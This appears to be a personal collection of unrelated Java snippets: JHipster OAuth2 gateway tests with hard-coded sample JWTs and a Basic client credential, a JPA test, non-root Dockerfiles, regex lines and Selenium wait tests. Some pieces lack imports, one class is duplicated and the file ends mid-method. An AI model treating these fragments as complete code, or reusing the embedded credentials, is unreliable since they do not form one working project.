package com.baeldung.jhipster.gateway.security.oauth2;

import com.baeldung.jhipster.gateway.config.oauth2.OAuth2Properties;
import com.baeldung.jhipster.gateway.web.filter.RefreshTokenFilter;
import com.baeldung.jhipster.gateway.web.rest.errors.InvalidPasswordException;
import io.github.jhipster.config.JHipsterProperties;
import org.junit.Assert;
import org.junit.Before;
import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.ExpectedException;
import org.junit.runner.RunWith;
import org.mockito.Mock;
import org.mockito.junit.MockitoJUnitRunner;
import org.springframework.http.*;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.mock.web.MockHttpServletResponse;
import org.springframework.security.oauth2.common.DefaultOAuth2AccessToken;
import org.springframework.security.oauth2.common.DefaultOAuth2RefreshToken;
import org.springframework.security.oauth2.common.OAuth2AccessToken;
import org.springframework.security.oauth2.common.exceptions.InvalidTokenException;
import org.springframework.security.oauth2.provider.token.TokenStore;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.HttpClientErrorException;
import org.springframework.web.client.RestTemplate;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

import static org.mockito.Mockito.when;

/**
 * Test password and refresh token grants.
 *
 * @see OAuth2AuthenticationService
 */
@RunWith(MockitoJUnitRunner.class)
public class OAuth2AuthenticationServiceTest {
    public static final String CLIENT_AUTHORIZATION = "Basic d2ViX2FwcDpjaGFuZ2VpdA==";
    public static final String ACCESS_TOKEN_VALUE = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE0OTQyNzI4NDQsInVzZXJfbmFtZSI6InVzZXIiLCJhdXRob3JpdGllcyI6WyJST0xFX1VTRVIiXSwianRpIjoiNzc1ZTJkYWUtYWYzZi00YTdhLWExOTktNzNiZTU1MmIxZDVkIiwiY2xpZW50X2lkIjoid2ViX2FwcCIsInNjb3BlIjpbIm9wZW5pZCJdfQ.gEK0YcX2IpkpxnkxXXHQ4I0xzTjcy7edqb89ukYE0LPe7xUcZVwkkCJF_nBxsGJh2jtA6NzNLfY5zuL6nP7uoAq3fmvsyrcyR2qPk8JuuNzGtSkICx3kPDRjAT4ST8SZdeh7XCbPVbySJ7ZmPlRWHyedzLA1wXN0NUf8yZYS4ELdUwVBYIXSjkNoKqfWm88cwuNr0g0teypjPtjDqCnXFt1pibwdfIXn479Y1neNAdvSpHcI4Ost-c7APCNxW2gqX-0BItZQearxRgKDdBQ7CGPAIky7dA0gPuKUpp_VCoqowKCXqkE9yKtRQGIISewtj2UkDRZePmzmYrUBXRzfYw";
    public static final String REFRESH_TOKEN_VALUE = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJ1c2VyIiwic2NvcGUiOlsib3BlbmlkIl0sImF0aSI6Ijc3NWUyZGFlLWFmM2YtNGE3YS1hMTk5LTczYmU1NTJiMWQ1ZCIsImV4cCI6MTQ5Njg2NDc0MywiYXV0aG9yaXRpZXMiOlsiUk9MRV9VU0VSIl0sImp0aSI6IjhmYjI2YTllLTdjYzQtNDFlMi1hNzBjLTk4MDc0N2U2YWFiOSIsImNsaWVudF9pZCI6IndlYl9hcHAifQ.q1-Df9_AFO6TJNiLKV2YwTjRbnd7qcXv52skXYnog5siHYRoR6cPtm6TNQ04iDAoIHljTSTNnD6DS3bHk41mV55gsSVxGReL8VCb_R8ZmhVL4-5yr90sfms0wFp6lgD2bPmZ-TXiS2Oe9wcbNWagy5RsEplZ-sbXu3tjmDao4FN35ojPsXmUs84XnNQH3Y_-PY9GjZG0JEfLQIvE0J5BkXS18Z015GKyA6GBIoLhAGBQQYyG9m10ld_a9fD5SmCyCF72Jad_pfP1u8Z_WyvO-wrlBvm2x-zBthreVrXU5mOb9795wJEP-xaw3dXYGjht_grcW4vKUFtj61JgZk98CQ";
    public static final String EXPIRED_SESSION_TOKEN_VALUE = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJ1c2VyIiwic2NvcGUiOlsib3BlbmlkIl0sImF0aSI6IjE0NTkwYzdkLTQ5M2YtNDU0NS05MzlmLTg1ODM4ZjRmNzNmNSIsImV4cCI6MTQ5NTU3Mjg5MywiaWF0IjoxNDk1MzIwODkzLCJhdXRob3JpdGllcyI6WyJST0xFX1VTRVIiXSwianRpIjoiNzVhYTIxNzEtMzFmNi00MWJmLWExZGUtYWU0YTg1ZjZiMjEyIiwiY2xpZW50X2lkIjoid2ViX2FwcCJ9.gAH-yly7WAslQUeGhyHmjYXwQN3dluvoT84iOJ2mVWYGVlnDRsoxN3_d1ozqtiso9UM7dWpAr80o3gK7AyK-cO1GGBXa3lg0ETsbucFoqHLivgGZA2qVOsFlDq8E7DZENAbOWmywmhFUOogCfZ-BqsuFSi8waMLL-1qlhehBPuK1KzGxIZbjSVUFFFYTxoWPKi2NNTBzYSwwCV0ixj-gHyFC6Gl5ByA4EvYygGUZF2pACxs4tIRkmT90pXWCjWeKS9k9MlxZ7C4UHqyTRW-IYzqAm8OHdwsnXeu0GkFYc08gxoUuPcjMby8ziYLG5uWj0Ua0msmiSjoafzs-5xfH-Q";
    public static final String NEW_ACCESS_TOKEN_VALUE = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE0OTQyNzY2NDEsInVzZXJfbmFtZSI6InVzZXIiLCJhdXRob3JpdGllcyI6WyJST0xFX1VTRVIiXSwianRpIjoiYzIyY2YzMDgtZTIyYi00YzNjLWI5MjctOTYwYzA2YmY1ZmU0IiwiY2xpZW50X2lkIjoid2ViX2FwcCIsInNjb3BlIjpbIm9wZW5pZCJdfQ.IAhE39GCqWRUuXdWy-raOcE9NYXRhGiqkeJH649501LeqNPH5HtRUNWmudVRgwT52Bj7HcbJapMLGetKIMEASqC1-WARfcZ_PR0r7Kfg3OlFALWOH_oVT5kvi2H-QCoSAF9mRYK6abCh_tPk5KryVB5c7YxTMIXDT2nTsSexD8eNQOMBWRCg0RaLHZ9bKfeyVgncQJsu7-vTo1xJyh-keYpdNZ0TA2SjYJgezmB7gwW1Kmc7_83htr8VycG7XA_PuD9--yRNlrN0LtNHEBqNypZsOe6NvpKiNlodFYHlsU1CaumzcF9U7dpVanjIUKJ5VRWVUlSFY6JJ755W29VCTw";
    public static final String NEW_REFRESH_TOKEN_VALUE = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJ1c2VyIiwic2NvcGUiOlsib3BlbmlkIl0sImF0aSI6ImMyMmNmMzA4LWUyMmItNGMzYy1iOTI3LTk2MGMwNmJmNWZlNCIsImV4cCI6MTQ5Njg2ODU4MSwiYXV0aG9yaXRpZXMiOlsiUk9MRV9VU0VSIl0sImp0aSI6ImU4YmZhZWJlLWYzMDItNGNjZS1hZGY1LWQ4MzE5OWM1MjBlOSIsImNsaWVudF9pZCI6IndlYl9hcHAifQ.OemWBUfc-2rl4t4VVqolYxul3L527PbSbX2Xvo7oyy3Vy5nmmblqp4hVGdTEjivrlldGVQX03ERbrA-oFkpmfWbBzLvnKS6AUq1MGjut6dXZJeiEqNYmiAABn6jSgK26S0k6b2ADgmf7mxJO8EBypb5sT1DMAbY5cbOe7r4ZG7zMTVSvlvjHTXp_FM8Y9i6nehLD4XDYY57cb_ZA89vAXNzvTAjoopDliExgR0bApG6nvvDEhEYgTS65lccEQocoev6bISJ3RvNYNPJxWcNPftKDp4HrEt2E2WP28K5IivRtQgDQNlQeormf1tp6AG-Oj__NXyAPM7yhAKXNy2zWdQ";
    @Mock
    private RestTemplate restTemplate;
    @Mock
    private TokenStore tokenStore;
    private OAuth2TokenEndpointClient authorizationClient;
    private OAuth2AuthenticationService authenticationService;
    private RefreshTokenFilter refreshTokenFilter;
    @Rule
    public ExpectedException expectedException = ExpectedException.none();
    private OAuth2Properties oAuth2Properties;
    private JHipsterProperties jHipsterProperties;

    @Before
    public void init() {
        oAuth2Properties = new OAuth2Properties();
        jHipsterProperties = new JHipsterProperties();
        jHipsterProperties.getSecurity().getClientAuthorization().setAccessTokenUri("http://uaa/oauth/token");
        OAuth2CookieHelper cookieHelper = new OAuth2CookieHelper(oAuth2Properties);
        OAuth2AccessToken accessToken = createAccessToken(ACCESS_TOKEN_VALUE, REFRESH_TOKEN_VALUE);

        mockInvalidPassword();
        mockPasswordGrant(accessToken);
        mockRefreshGrant();

        authorizationClient = new UaaTokenEndpointClient(restTemplate, jHipsterProperties, oAuth2Properties);
        authenticationService = new OAuth2AuthenticationService(authorizationClient, cookieHelper);
        when(tokenStore.readAccessToken(ACCESS_TOKEN_VALUE)).thenReturn(accessToken);
        refreshTokenFilter = new RefreshTokenFilter(authenticationService, tokenStore);
    }

    public static OAuth2AccessToken createAccessToken(String accessTokenValue, String refreshTokenValue) {
        DefaultOAuth2AccessToken accessToken = new DefaultOAuth2AccessToken(accessTokenValue);
        accessToken.setExpiration(new Date());          //token expires now
        DefaultOAuth2RefreshToken refreshToken = new DefaultOAuth2RefreshToken(refreshTokenValue);
        accessToken.setRefreshToken(refreshToken);
        return accessToken;
    }

    public static MockHttpServletRequest createMockHttpServletRequest() {
        MockHttpServletRequest request = new MockHttpServletRequest(HttpMethod.GET.name(), "http://www.test.com");
        Cookie accessTokenCookie = new Cookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE, ACCESS_TOKEN_VALUE);
        Cookie refreshTokenCookie = new Cookie(OAuth2CookieHelper.REFRESH_TOKEN_COOKIE, REFRESH_TOKEN_VALUE);
        request.setCookies(accessTokenCookie, refreshTokenCookie);
        return request;
    }

    private void mockInvalidPassword() {
        HttpHeaders reqHeaders = new HttpHeaders();
        reqHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
        reqHeaders.add("Authorization", CLIENT_AUTHORIZATION);                //take over Authorization header from client request to UAA request
        MultiValueMap<String, String> formParams = new LinkedMultiValueMap<>();
        formParams.set("username", "user");
        formParams.set("password", "user2");
        formParams.add("grant_type", "password");
        HttpEntity<MultiValueMap<String, String>> entity = new HttpEntity<>(formParams, reqHeaders);
        when(restTemplate.postForEntity("http://uaa/oauth/token", entity, OAuth2AccessToken.class))
            .thenThrow(new HttpClientErrorException(HttpStatus.BAD_REQUEST));
    }

    private void mockPasswordGrant(OAuth2AccessToken accessToken) {
        HttpHeaders reqHeaders = new HttpHeaders();
        reqHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
        reqHeaders.add("Authorization", CLIENT_AUTHORIZATION);                //take over Authorization header from client request to UAA request
        MultiValueMap<String, String> formParams = new LinkedMultiValueMap<>();
        formParams.set("username", "user");
        formParams.set("password", "user");
        formParams.add("grant_type", "password");
        HttpEntity<MultiValueMap<String, String>> entity = new HttpEntity<>(formParams, reqHeaders);
        when(restTemplate.postForEntity("http://uaa/oauth/token", entity, OAuth2AccessToken.class))
            .thenReturn(new ResponseEntity<OAuth2AccessToken>(accessToken, HttpStatus.OK));
    }

    private void mockRefreshGrant() {
        MultiValueMap<String, String> params = new LinkedMultiValueMap<>();
        params.add("grant_type", "refresh_token");
        params.add("refresh_token", REFRESH_TOKEN_VALUE);
        //we must authenticate with the UAA server via HTTP basic authentication using the browser's client_id with no client secret
        HttpHeaders headers = new HttpHeaders();
        headers.add("Authorization", CLIENT_AUTHORIZATION);
        HttpEntity<MultiValueMap<String, String>> entity = new HttpEntity<>(params, headers);
        OAuth2AccessToken newAccessToken = createAccessToken(NEW_ACCESS_TOKEN_VALUE, NEW_REFRESH_TOKEN_VALUE);
        when(restTemplate.postForEntity("http://uaa/oauth/token", entity, OAuth2AccessToken.class))
            .thenReturn(new ResponseEntity<OAuth2AccessToken>(newAccessToken, HttpStatus.OK));
    }

    @Test
    public void testAuthenticationCookies() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("www.test.com");
        request.addHeader("Authorization", CLIENT_AUTHORIZATION);
        Map<String, String> params = new HashMap<>();
        params.put("username", "user");
        params.put("password", "user");
        params.put("rememberMe", "true");
        MockHttpServletResponse response = new MockHttpServletResponse();
        authenticationService.authenticate(request, response, params);
        //check that cookies are set correctly
        Cookie accessTokenCookie = response.getCookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE);
        Assert.assertEquals(ACCESS_TOKEN_VALUE, accessTokenCookie.getValue());
        Cookie refreshTokenCookie = response.getCookie(OAuth2CookieHelper.REFRESH_TOKEN_COOKIE);
        Assert.assertEquals(REFRESH_TOKEN_VALUE, OAuth2CookieHelper.getRefreshTokenValue(refreshTokenCookie));
        Assert.assertTrue(OAuth2CookieHelper.isRememberMe(refreshTokenCookie));
    }

    @Test
    public void testAuthenticationNoRememberMe() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("www.test.com");
        Map<String, String> params = new HashMap<>();
        params.put("username", "user");
        params.put("password", "user");
        params.put("rememberMe", "false");
        MockHttpServletResponse response = new MockHttpServletResponse();
        authenticationService.authenticate(request, response, params);
        //check that cookies are set correctly
        Cookie accessTokenCookie = response.getCookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE);
        Assert.assertEquals(ACCESS_TOKEN_VALUE, accessTokenCookie.getValue());
        Cookie refreshTokenCookie = response.getCookie(OAuth2CookieHelper.SESSION_TOKEN_COOKIE);
        Assert.assertEquals(REFRESH_TOKEN_VALUE, OAuth2CookieHelper.getRefreshTokenValue(refreshTokenCookie));
        Assert.assertFalse(OAuth2CookieHelper.isRememberMe(refreshTokenCookie));
    }

    @Test
    public void testInvalidPassword() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("www.test.com");
        Map<String, String> params = new HashMap<>();
        params.put("username", "user");
        params.put("password", "user2");
        params.put("rememberMe", "false");
        MockHttpServletResponse response = new MockHttpServletResponse();
        expectedException.expect(InvalidPasswordException.class);
        authenticationService.authenticate(request, response, params);
    }

    @Test
    public void testRefreshGrant() {
        MockHttpServletRequest request = createMockHttpServletRequest();
        MockHttpServletResponse response = new MockHttpServletResponse();
        HttpServletRequest newRequest = refreshTokenFilter.refreshTokensIfExpiring(request, response);
        Cookie newAccessTokenCookie = response.getCookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE);
        Assert.assertEquals(NEW_ACCESS_TOKEN_VALUE, newAccessTokenCookie.getValue());
        Cookie newRefreshTokenCookie = response.getCookie(OAuth2CookieHelper.REFRESH_TOKEN_COOKIE);
        Assert.assertEquals(NEW_REFRESH_TOKEN_VALUE, newRefreshTokenCookie.getValue());
        Cookie requestAccessTokenCookie = OAuth2CookieHelper.getAccessTokenCookie(newRequest);
        Assert.assertEquals(NEW_ACCESS_TOKEN_VALUE, requestAccessTokenCookie.getValue());
    }

    @Test
    public void testSessionExpired() {
        MockHttpServletRequest request = new MockHttpServletRequest(HttpMethod.GET.name(), "http://www.test.com");
        Cookie accessTokenCookie = new Cookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE, ACCESS_TOKEN_VALUE);
        Cookie refreshTokenCookie = new Cookie(OAuth2CookieHelper.SESSION_TOKEN_COOKIE, EXPIRED_SESSION_TOKEN_VALUE);
        request.setCookies(accessTokenCookie, refreshTokenCookie);
        MockHttpServletResponse response = new MockHttpServletResponse();
        HttpServletRequest newRequest = refreshTokenFilter.refreshTokensIfExpiring(request, response);
        //cookies in response are deleted
        Cookie newAccessTokenCookie = response.getCookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE);
        Assert.assertEquals(0, newAccessTokenCookie.getMaxAge());
        Cookie newRefreshTokenCookie = response.getCookie(OAuth2CookieHelper.REFRESH_TOKEN_COOKIE);
        Assert.assertEquals(0, newRefreshTokenCookie.getMaxAge());
        //request no longer contains cookies
        Cookie requestAccessTokenCookie = OAuth2CookieHelper.getAccessTokenCookie(newRequest);
        Assert.assertNull(requestAccessTokenCookie);
        Cookie requestRefreshTokenCookie = OAuth2CookieHelper.getRefreshTokenCookie(newRequest);
        Assert.assertNull(requestRefreshTokenCookie);
    }

    /**
     * If no refresh token is found and the access token has expired, then expect an exception.
     */
    @Test
    public void testRefreshGrantNoRefreshToken() {
        MockHttpServletRequest request = new MockHttpServletRequest(HttpMethod.GET.name(), "http://www.test.com");
        Cookie accessTokenCookie = new Cookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE, ACCESS_TOKEN_VALUE);
        request.setCookies(accessTokenCookie);
        MockHttpServletResponse response = new MockHttpServletResponse();
        expectedException.expect(InvalidTokenException.class);
        refreshTokenFilter.refreshTokensIfExpiring(request, response);
    }

    @Test
    public void testLogout() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        Cookie accessTokenCookie = new Cookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE, ACCESS_TOKEN_VALUE);
        Cookie refreshTokenCookie = new Cookie(OAuth2CookieHelper.REFRESH_TOKEN_COOKIE, REFRESH_TOKEN_VALUE);
        request.setCookies(accessTokenCookie, refreshTokenCookie);
        MockHttpServletResponse response = new MockHttpServletResponse();
        authenticationService.logout(request, response);
        Cookie newAccessTokenCookie = response.getCookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE);
        Assert.assertEquals(0, newAccessTokenCookie.getMaxAge());
        Cookie newRefreshTokenCookie = response.getCookie(OAuth2CookieHelper.REFRESH_TOKEN_COOKIE);
        Assert.assertEquals(0, newRefreshTokenCookie.getMaxAge());
    }

    @Test
    public void testStripTokens() {
        MockHttpServletRequest request = createMockHttpServletRequest();
        HttpServletRequest newRequest = authenticationService.stripTokens(request);
        CookieCollection cookies = new CookieCollection(newRequest.getCookies());
        Assert.assertFalse(cookies.contains(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE));
        Assert.assertFalse(cookies.contains(OAuth2CookieHelper.REFRESH_TOKEN_COOKIE));
    }
}

 
 
 
 
package com.baeldung.jhipster.gateway.security.oauth2;

import org.junit.Assert;
import org.junit.Before;
import org.junit.Test;
import org.springframework.http.HttpMethod;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.security.core.Authentication;
import org.springframework.security.oauth2.common.OAuth2AccessToken;

/**
 * Test whether the CookieTokenExtractor can properly extract access tokens from
 * Cookies and Headers.
 */
public class CookieTokenExtractorTest {
    private CookieTokenExtractor cookieTokenExtractor;

    @Before
    public void init() {
        cookieTokenExtractor = new CookieTokenExtractor();
    }

    @Test
    public void testExtractTokenCookie() {
        MockHttpServletRequest request = OAuth2AuthenticationServiceTest.createMockHttpServletRequest();
        Authentication authentication = cookieTokenExtractor.extract(request);
        Assert.assertEquals(OAuth2AuthenticationServiceTest.ACCESS_TOKEN_VALUE, authentication.getPrincipal().toString());
    }

    @Test
    public void testExtractTokenHeader() {
        MockHttpServletRequest request = new MockHttpServletRequest(HttpMethod.GET.name(), "http://www.test.com");
        request.addHeader("Authorization", OAuth2AccessToken.BEARER_TYPE + " " + OAuth2AuthenticationServiceTest.ACCESS_TOKEN_VALUE);
        Authentication authentication = cookieTokenExtractor.extract(request);
        Assert.assertEquals(OAuth2AuthenticationServiceTest.ACCESS_TOKEN_VALUE, authentication.getPrincipal().toString());
    }

    @Test
    public void testExtractTokenParam() {
        MockHttpServletRequest request = new MockHttpServletRequest(HttpMethod.GET.name(), "http://www.test.com");
        request.addParameter(OAuth2AccessToken.ACCESS_TOKEN, OAuth2AuthenticationServiceTest.ACCESS_TOKEN_VALUE);
        Authentication authentication = cookieTokenExtractor.extract(request);
        Assert.assertEquals(OAuth2AuthenticationServiceTest.ACCESS_TOKEN_VALUE, authentication.getPrincipal().toString());
    }
}

 
https://blog.csdn.net/liusanyu/article/details/78840483
 
 
@RunWith(SpringRunner.class)
@DataJpaTest
@AutoConfigureEmbeddedDatabase
public class SpringDataJpaAnnotationTest {

    @Autowired
    private PersonRepository personRepository;

    @Test
    public void testEmbeddedDatabase() {
        Optional<Person> personOptional = personRepository.findById(1L);

        assertThat(personOptional).hasValueSatisfying(person -> {
            assertThat(person.getId()).isNotNull();
            assertThat(person.getFirstName()).isEqualTo("Dave");
            assertThat(person.getLastName()).isEqualTo("Syer");
        });
    }
}

Standard Dockerfile
FROM openjdk:8-jdk

RUN groupadd --system --gid 1000 test
RUN useradd --system --gid test --uid 1000 --shell /bin/bash --create-home test

USER test
WORKDIR /home/test
Alpine Dockerfile
FROM openjdk:8-jdk-alpine

RUN addgroup -S -g 1000 test
RUN adduser -D -S -G test -u 1000 -s /bin/ash test

USER test
WORKDIR /home/test
--------------------------------------------------------------------------------------------------------
String complexString = "3ifhuq023hjk@jka$ksoap";
complexString.replaceAll("\\D", "")


String complexString = "3ifhuq023hjk@jka$ksoap";
complexString.replaceAll("\\d", "")

str.replaceAll("[^\\p{Alnum}\\s]", "")
--------------------------------------------------------------------------------------------------------

import browser.BrowserGetter;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.support.PageFactory;
import org.testng.annotations.AfterClass;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Test;
import pageobjects.waiter.WaiterPage;
import waiter.Waiter;

public class ClickTest {
    private Waiter waiter = new Waiter();
    private WaiterPage page;
    private WebDriver driver;
    private BrowserGetter browserGetter = new BrowserGetter();

    @BeforeClass
    public void beforeClass() {
        //initialize the Chrome browser here
        driver = browserGetter.getChromeDriver();
        //initialize page object class
        page = PageFactory.initElements(driver, WaiterPage.class);
    }

    @AfterClass
    public void afterClass() {
        driver.quit();
    }

    @Test
    public void clickTest() {
        waiter.get("https://imalittletester.com", driver);
        waiter.click(page.searchButton, driver);
        waiter.click(page.menuLink, driver);
    }

    @Test
    public void clickTestSpecifiedTimeout() {
        waiter.get("https://imalittletester.com", driver);
        waiter.click(page.searchButton, driver, 5);
        waiter.click(page.menuLink, driver, 20);
    }
}
--------------------------------------------------------------------------------------------------------
import browser.BrowserGetter;
import org.openqa.selenium.Keys;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.support.PageFactory;
import org.testng.annotations.AfterClass;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Test;
import pageobjects.waiter.WaiterPage;
import waiter.Waiter;

public class UrlTest {
    private Waiter waiter = new Waiter();
    private WaiterPage page;
    private WebDriver driver;
    private BrowserGetter browserGetter = new BrowserGetter();

    @BeforeClass
    public void beforeClass() {
        //initialize the Chrome browser here
        driver = browserGetter.getChromeDriver();
        //initialize page object class
        page = PageFactory.initElements(driver, WaiterPage.class);
    }

    @AfterClass
    public void afterClass() {
        driver.quit();
    }

    @Test
    public void waitForUrlEqualsOrContains() {
        waiter.get("https://imalittletester.com", driver);

        waiter.click(page.searchButton, driver);
        page.searchField.sendKeys("checkstyle");
        page.searchField.sendKeys(Keys.ENTER);
        waiter.waitForUrl("https://imalittletester.com/?s=checkstyle", driver);

        waiter.click(page.searchButton, driver);
        page.searchField.clear();
        page.searchField.sendKeys("waiter");
        page.searchField.sendKeys(Keys.ENTER);
        waiter.waitForUrlContains("waiter", driver);

        waiter.click(page.searchButton, driver);
        page.searchField.clear();
        page.searchField.sendKeys("CheckStyle");
        page.searchField.sendKeys(Keys.ENTER);
        //the actual URL that will open here is: https://imalittletester.com/?s=checkstyle
        waiter.waitForUrl_IgnoreCase("https://imalittletester.com/?s=checkstyle", driver);

        waiter.click(page.searchButton, driver);
        page.searchField.clear();
        page.searchField.sendKeys("WAITER");
        page.searchField.sendKeys(Keys.ENTER);
        //the actual url that will open is: https://imalittletester.com/?s=WAITER
        waiter.waitForUrlContains_IgnoreCase("waiter", driver);

    }

    @Test
    public void urlStartsWith() {
        waiter.get("http://imalittletester.com", driver);
        waiter.waitForUrlStartsWith("https", driver);
    }

    @Test
    public void waitForUrlEqualsOrContainsWithSpecifiedTimeout() {
        waiter.get("https://imalittletester.com", driver);

        waiter.click(page.searchButton, driver);
        page.searchField.sendKeys("checkstyle");
        page.searchField.sendKeys(Keys.ENTER);
        waiter.waitForUrl("https://imalittletester.com/?s=checkstyle", driver, 15);

        waiter.click(page.searchButton, driver);
        page.searchField.clear();
        page.searchField.sendKeys("waiter");
        page.searchField.sendKeys(Keys.ENTER);
        waiter.waitForUrlContains("waiter", driver, 15);

        waiter.click(page.searchButton, driver);
        page.searchField.clear();
        page.searchField.sendKeys("CheckStyle");
        page.searchField.sendKeys(Keys.ENTER);
        //the actual URL that will open here is: https://imalittletester.com/?s=checkstyle
        waiter.waitForUrl_IgnoreCase("https://imalittletester.com/?s=checkstyle", driver, 15);

        waiter.click(page.searchButton, driver);
        page.searchField.clear();
        page.searchField.sendKeys("WAITER");
        page.searchField.sendKeys(Keys.ENTER);
        //the actual url that will open is: https://imalittletester.com/?s=WAITER
        waiter.waitForUrlContains_IgnoreCase("waiter", driver, 15);

    }

    @Test
    public void urlStartsWithAndSpecifiedTimeout() {
        waiter.get("http://imalittletester.com", driver);
        waiter.waitForUrlStartsWith("https", driver, 5);
    }
}
--------------------------------------------------------------------------------------------------------
import browser.BrowserGetter;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.support.PageFactory;
import org.testng.annotations.AfterClass;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Test;
import pageobjects.waiter.WaiterPage;
import waiter.Waiter;

public class GetTest {
    private Waiter waiter = new Waiter();
    private WaiterPage page;
    private WebDriver driver;
    private BrowserGetter browserGetter = new BrowserGetter();

    @BeforeClass
    public void beforeClass() {
        //initialize the Chrome browser here
        driver = browserGetter.getChromeDriver();
        //initialize page object class
        page = PageFactory.initElements(driver, WaiterPage.class);
    }

    @AfterClass
    public void afterClass() {
        driver.quit();
    }

    /**
     * A test that opens a page and waits for it to be fully loaded
     * Uses implicit timeout of 30 seconds which is set in the Waiter class
     */
    @Test
    public void getTest() {
        waiter.get("http://www.google.com", driver);
    }

    /**
     * A test that opens a page and waits for it to be fully loaded for 10 seconds
     */
    @Test
    public void getTestTimeout10Seconds() {
        waiter.get("http://www.google.com", driver, 10);
    }

    /**
     * A test that opens a page and waits for it to be fully loaded
     * Then it waits for a WebElement, declared in the WaiterPage class, to be displayed
     * Uses implicit timeout of 30 seconds which is set in the Waiter class
     */
    @Test
    public void getAndWaitForElementToBeDisplayedTest() {
        waiter.getAndWaitForElementToBeDisplayed("http://www.bing.com", page.bingSearchField, driver);
    }

    /**
     * A test that opens a page and waits for it to be fully loaded for 10 seconds
     * Then it waits for a WebElement, declared in the WaiterPage class, to be displayed, for 10 seconds
     */
    @Test
    public void getAndWaitForElementToBeDisplayedTestTimeout10Seconds() {
        waiter.getAndWaitForElementToBeDisplayed("http://www.bing.com", page.bingSearchField, driver, 10);
    }

    /**
     * A test that opens a URL in the browser, but waits for another URL to load.
     * This is useful when some redirects are being made and you are interested in landing on the second provided URL.
     * Also waits for the final URL's page to load completely, for the default timeout value of 30 seconds
     */
    @Test
    public void getUrlAndWaitForUrl() {
        waiter.getUrlAndWaitForUrl("http://imalittletester.com/", "https://imalittletester.com/", driver);
    }

    /**
     * A test that opens a URL in the browser, but waits for another URL to load.
     * This is useful when some redirects are being made and you are interested in landing on the second provided URL.
     * Also waits for the final URL's page to load completely, for the specified timeout of 5 seconds
     */
    @Test
    public void getUrlAndWaitForUrlTimeout5Seconds() {
        waiter.getUrlAndWaitForUrl("http://imalittletester.com/", "https://imalittletester.com/", driver, 5);
    }

    /**
     * This test illustrates how to use the waitForPageLoadComplete method on its own.
     * The test just opens a page, refreshes it, and waits for it to load completely after the refresh.
     * Uses the default timeout value from thewaiter library
     */
    @Test
    public void waitForPageLoadComplete() {
        waiter.get("http://www.google.com", driver);
        driver.navigate().refresh();
        waiter.waitForPageLoadComplete(driver);
    }

    /**
     * This test illustrates how to use the waitForPageLoadComplete method on its own.
     * The test just opens a page, refreshes it, and waits for it to load completely after the refresh.
     * Waits for 10 seconds for the page to load after the refresh
     */
    @Test
    public void waitForPageLoadCompleteTimeout10Seconds() {
        waiter.get("http://www.google.com", driver);
        driver.navigate().refresh();
        waiter.waitForPageLoadComplete(driver, 10);
    }
}
--------------------------------------------------------------------------------------------------------
import browser.BrowserGetter;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.support.PageFactory;
import org.testng.annotations.AfterClass;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Test;
import pageobjects.waiter.WaiterPage;
import waiter.Waiter;

public class ClickTest {
    private Waiter waiter = new Waiter();
    private WaiterPage page;
    private WebDriver driver;
    private BrowserGetter browserGetter = new BrowserGetter();

    @BeforeClass
    public void beforeClass() {
        //initialize the Chrome browser here
        driver = browserGetter.getChromeDriver();
        //initialize page object class
        page = PageFactory.initElements(driver, WaiterPage.class);
    }

    @AfterClass
    public void afterClass() {
        driver.quit();
    }

    @Test
    public void clickTest() {
        waiter.get("https://imalittletester.com", driver);
        waiter.click(page.searchButton, driver);
        waiter.click(page.menuLink, driver);
    }

    @Test
    public void clickTestSpecifiedTimeout() {
        waiter.get("https://imalittletester.com", driver);
        waiter.click(page.searchButton, driver, 5);
        waiter.click(page.menuLink, driver, 20);
    }
}
--------------------------------------------------------------------------------------------------------

import org.openqa.selenium.By;
import org.openqa.selenium.WebElement;

public class Module {
    private Image image;
    private String h2Text;

    public Module(Image image, String h2Text) {
        this.image = image;
        this.h2Text = h2Text;
    }

    public Module(WebElement element) {
        this.image = new Image(element.findElement(By.cssSelector("img")));
        this.h2Text = element.findElement(By.cssSelector("h2")).getText();
    }

    @Override
    public boolean equals(Object o) {
        if (this == o)
            return true;
        if (o == null || getClass() != o.getClass())
            return false;

        Module module = (Module) o;

        if (image != null ? !image.equals(module.image) : module.image != null)
            return false;
        return h2Text != null ? h2Text.equals(module.h2Text) : module.h2Text == null;
    }

    @Override
    public int hashCode() {
        int result = image != null ? image.hashCode() : 0;
